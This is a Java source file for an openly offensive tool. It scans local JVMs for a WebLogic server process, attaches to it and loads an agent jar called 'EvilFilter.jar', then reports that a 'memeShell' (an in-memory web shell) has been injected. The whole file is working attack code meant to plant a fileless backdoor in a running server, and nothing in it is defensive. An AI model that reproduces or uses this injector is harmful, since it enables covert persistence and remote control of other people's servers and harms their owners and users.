import java.io.File;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.Properties;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

public class Attach {

    public static void main(String[] args) throws Exception {

        VirtualMachine vm = null;
        List<VirtualMachineDescriptor> vmList = null;
        String agentFile =  "D:\\EvilFilter.jar";

        while (true) {
            try {
                vmList = VirtualMachine.list();
                if (vmList.size() <= 0)
                    continue;
                for (VirtualMachineDescriptor vmd : vmList) {

                    if (vmd.displayName().indexOf("weblogic.Server") >= 0) {
                        vm = VirtualMachine.attach(vmd);

                        System.out.println("[+]OK.i find a jvm.");
                        Thread.sleep(1000);
                        if (null != vm) {
                            vm.loadAgent(agentFile, "");
                            System.out.println("[+]memeShell is injected.");
                            vm.detach();
                            return;
                        }
                    }
                }
                Thread.sleep(3000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
